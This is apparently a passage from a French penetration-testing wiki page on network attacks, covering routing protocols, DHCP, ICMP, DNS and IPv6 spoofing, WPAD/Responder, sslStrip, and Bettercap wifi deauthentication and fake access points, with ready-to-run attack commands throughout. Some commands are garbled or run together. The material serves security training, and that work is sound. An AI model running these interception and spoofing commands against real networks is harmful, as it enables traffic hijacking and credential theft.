### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles réseau conçue pour **créer un système de routage redondant chaud**. Avec FHRP, des routeurs physiques peuvent être combinés en un seul dispositif logique, ce qui augmente la tolérance aux pannes et aide à répartir la charge.

**Les ingénieurs de Cisco Systems ont développé deux protocoles FHRP, GLBP et HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Trois versions du Routing Information Protocol (RIP) existent : RIP, RIPv2 et RIPng. Les datagrammes sont envoyés aux pairs via le port 520 en UDP par RIP et RIPv2, tandis que RIPng diffuse les datagrammes sur le port UDP 521 via le multicast IPv6. Le support de l'authentification MD5 a été introduit par RIPv2. En revanche, RIPng n'intègre pas d'authentification native ; il s'appuie sur les en-têtes IPsec AH et ESP optionnels dans IPv6.

- **RIP et RIPv2 :** La communication s'effectue via des datagrammes UDP sur le port 520.
- **RIPng :** Utilise le port UDP 521 pour diffuser des datagrammes via le multicast IPv6.

Notez que RIPv2 prend en charge l'authentification MD5 tandis que RIPng n'inclut pas d'authentification native, s'appuyant sur les en-têtes IPsec AH et ESP dans IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole à vecteur de distance.** S'il n'y a **aucune authentification** et configuration d'interfaces passives, un **intrus** peut perturber le routage EIGRP et provoquer un **empoisonnement des tables de routage**. De plus, le réseau EIGRP (autrement dit, le système autonome) **est plat et n'est segmenté en aucune zone**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le système EIGRP autonome.

Pour attaquer un système EIGRP, il faut **établir un voisinage avec un routeur EIGRP légitime**, ce qui ouvre de nombreuses possibilités, de la simple reconnaissance à diverses injections.

[**FRRouting**](https://frrouting.org/) permet d'implémenter **un routeur virtuel qui prend en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Il suffit de le déployer sur le système de l'attaquant et vous pouvez en fait vous faire passer pour un routeur légitime dans le domaine de routage.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) permet d'intercepter les broadcasts EIGRP (Enhanced Interior Gateway Routing Protocol). Il permet également l'injection de paquets, qui peuvent être utilisés pour modifier les configurations de routage.

### OSPF

Dans le protocole Open Shortest Path First (OSPF), **l'authentification MD5 est couramment utilisée pour assurer une communication sécurisée entre routeurs**. Cependant, cette mesure de sécurité peut être compromise à l'aide d'outils tels que Loki et John the Ripper. Ces outils sont capables de capturer et de cracker des hash MD5, exposant la clé d'authentification. Une fois cette clé obtenue, elle peut être utilisée pour introduire de nouvelles informations de routage. Pour configurer les paramètres de route et établir la clé compromise, les onglets _Injection_ et _Connection_ sont utilisés, respectivement.

- **Capture et cassage des hash MD5 :** Des outils tels que Loki et John the Ripper sont utilisés.
- **Configuration des paramètres de route :** Cela se fait via l'onglet _Injection_.
- **Définition de la clé compromise :** La clé est configurée sous l'onglet _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Outil pour scanner le trafic réseau et trouver des vulnérabilités
- Vous pouvez trouver plus d'**informations sur les attaques réseau** [**ici**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaquant configure tous les paramètres réseau (GW, IP, DNS) du nouveau membre du réseau en envoyant de fausses réponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Voir la [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste à envoyer un ICMP packet type 1 code 5 indiquant que l'attacker est le meilleur chemin pour atteindre une IP. Ensuite, lorsque la victim souhaite contacter l'IP, elle enverra le packet via l'attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant résoudra certains (ou tous) des domaines demandés par la victime.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Il existe souvent plusieurs routes vers des systèmes et des réseaux. Après avoir constitué une liste d'adresses MAC sur le réseau local, utilisez _gateway-finder.py_ pour identifier les hôtes qui prennent en charge le routage IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pour la résolution des hôtes locaux lorsque les requêtes DNS échouent, les systèmes Microsoft s'appuient sur **Link-Local Multicast Name Resolution (LLMNR)** et le **NetBIOS Name Service (NBT-NS)**. De même, les implémentations **Apple Bonjour** et **Linux zero-configuration** utilisent **Multicast DNS (mDNS)** pour découvrir des systèmes sur le réseau. En raison du caractère non authentifié de ces protocoles et du fait qu'ils fonctionnent sur UDP en diffusant des messages, ils peuvent être exploités par des attaquants cherchant à rediriger les utilisateurs vers des services malveillants.

Vous pouvez usurper des services recherchés par les hôtes en utilisant Responder pour envoyer de fausses réponses.\
Lisez ici plus d'informations sur [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les navigateurs utilisent couramment le protocole **Web Proxy Auto-Discovery (WPAD)** pour acquérir automatiquement les paramètres de proxy. Cela implique de récupérer des détails de configuration à partir d'un serveur, typiquement via une URL comme "http://wpad.example.org/wpad.dat". La découverte de ce serveur par les clients peut se faire par différents mécanismes :

- Via **DHCP**, où la découverte est facilitée en utilisant une entrée spéciale code 252.
- Par **DNS**, qui consiste à rechercher un nom d'hôte libellé _wpad_ dans le domaine local.
- Via **Microsoft LLMNR and NBT-NS**, qui sont des mécanismes de secours utilisés lorsque les recherches DNS échouent.

L'outil Responder profite de ce protocole en agissant comme un **serveur WPAD malveillant**. Il utilise DHCP, DNS, LLMNR, et NBT-NS pour induire les clients en erreur et les faire se connecter à lui. Pour approfondir la façon dont des services peuvent être usurpés en utilisant Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez proposer différents services sur le réseau pour tenter de **tromper un utilisateur** afin qu'il saisisse des **identifiants en clair**. **Plus d'informations sur cette attaque dans** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Cette attaque est très similaire à ARP Spoofing mais dans l'univers IPv6. Vous pouvez faire croire à la victime que l'adresse IPv6 de la GW correspond au MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Certains OS configurent par défaut la gateway à partir des paquets RA envoyés sur le réseau. Pour déclarer l'attaquant comme IPv6 router, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Par défaut, certains OS essaient de configurer le DNS en lisant un paquet DHCPv6 présent sur le réseau. Un attaquant peut donc envoyer un paquet DHCPv6 pour se configurer comme serveur DNS. Le DHCP fournit également une adresse IPv6 à la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (page factice et injection de code JS)

## Attaques Internet

### sslStrip

En gros, cette attaque fait que si l'**user** tente d'**access** une page **HTTP** qui est en **redirecting** vers la version **HTTPS**, **sslStrip** va **maintain** une **HTTP connection with** le **client and** une **HTTPS connection with** le **server**, de sorte qu'il pourra **sniff** la connexion en **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'infos [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **différence** entre **sslStrip+ et dns2proxy** et **sslStrip** est qu'ils vont **rediriger**, par exemple, _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **"w"** **supplémentaire**) et vont définir **l'adresse de ce domaine comme l'IP de l'attaquant**. De cette façon, le **client** va **se connecter** à _**wwww.facebook.com**_ **(l'attaquant)** mais en coulisses **sslstrip+** va **maintenir** la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est de **éviter HSTS** parce que _**wwww**.facebook.com_ **ne sera pas** enregistré dans le **cache** du navigateur, donc le navigateur sera trompé et effectuera **l'authentification facebook en HTTP**.\
Notez que pour réaliser cette attaque la victime doit initialement tenter d'accéder à [http://www.faceook.com](http://www.faceook.com) et non en https. Cela peut être fait en modifiant les liens à l'intérieur d'une page http.

Plus d'infos [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionnent plus. Cela s'explique par le fait qu'il existe des règles HSTS pré-enregistrées dans les navigateurs, donc même si c'est la première fois qu'un utilisateur accède à un domaine "important" il y accédera via HTTPS. De plus, notez que les règles pré-enregistrées et d'autres règles générées peuvent utiliser le flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple** _**wwww.facebook.com**_ **ci‑dessus ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Écoute TCP sur le port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Écoute TCP + SSL sur un port

#### Générer les clés et un certificat auto-signé
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Écouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Écouter en utilisant un certificat et rediriger vers les hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client vérifie que la CA est valide, vous pouvez **servir un certificate d'un autre hostname signé par une CA**.\
Un autre test intéressant consiste à servir un c**ertificate du requested hostname mais self-signed**.

Autres choses à tester : essayer de signer le certificate avec un certificate valide qui n'est pas une CA valide. Ou utiliser la public key valide, forcer l'utilisation d'un algorithme comme diffie hellman (un qui n'a pas besoin de déchiffrer quoi que ce soit avec la vraie private key) et, lorsque le client demande une probe de la vraie private key (comme un hash), envoyer une probe factice et s'attendre à ce que le client ne vérifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de découverte active

Prenez en compte que lorsqu'un paquet UDP est envoyé à un appareil qui n'a pas le port demandé, un ICMP (Port Unreachable) est renvoyé.

### **ARP discover**

Les paquets ARP sont utilisés pour découvrir quelles adresses IP sont utilisées à l'intérieur du réseau. Le PC doit envoyer une requête pour chaque adresse IP possible et seules celles qui sont utilisées répondront.

### **mDNS (multicast DNS)**

Bettercap envoie une requête mDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local** ; la machine qui voit ce paquet répond généralement à cette requête. Ensuite, il ne recherche que les machines répondant à "services".

**Outils**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap envoie des paquets broadcast vers le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap envoie des paquets SSDP en broadcast à la recherche de toutes sortes de services (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap envoie des paquets WSD en broadcast à la recherche de services (UDP Port 3702).


### Exploitation Telecom / Mobile-Core (GTP)


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Références

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
